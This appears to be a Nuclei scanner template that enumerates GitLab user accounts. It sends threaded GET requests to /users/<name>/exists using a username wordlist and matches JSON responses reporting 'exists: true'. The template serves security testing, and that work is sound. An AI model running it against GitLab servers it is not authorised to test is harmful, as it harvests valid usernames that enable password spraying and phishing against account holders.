id: gitlab-user-enumeration

info:
  name: GitLab - User Enumeration
  author: Suman Kar
  severity: info
  tags: fuzzer,gitlab,enumeration
  
requests:
  - payloads:
      dlist: helpers/wordlists/user-list.txt

    attack: sniper
    threads: 100

    raw:
      - |
        GET /users/{{dlist}}/exists HTTP/1.1 
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
        Accept-Language: en-US,en;q=0.9
        Accept: application/json, text/plain, */*
        Referer: {{BaseURL}}
        Connection: keep-alive 

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "exists.*:true"
        part: body

      - type: status
        status:
          - 200 